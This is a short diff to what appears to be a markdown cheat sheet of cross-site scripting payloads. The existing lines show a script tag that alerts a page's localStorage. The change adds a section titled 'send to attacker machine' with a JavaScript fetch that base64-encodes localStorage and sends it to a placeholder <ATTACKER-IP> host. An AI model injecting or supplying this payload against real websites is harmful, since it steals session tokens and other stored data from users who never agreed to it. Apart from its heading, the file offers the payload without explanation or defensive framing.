@@ -5,4 +5,7 @@ Prints out the localstorage
 <script>alert(JSON.stringify(localStorage))</script>
 ```
 
-## base64 encode 
+## base64 encode and send to attacker machine
+```javascript
+fetch(`http://<ATTACKER-IP>/${btoa(JSON.stringify(localStorage))}`)
+```
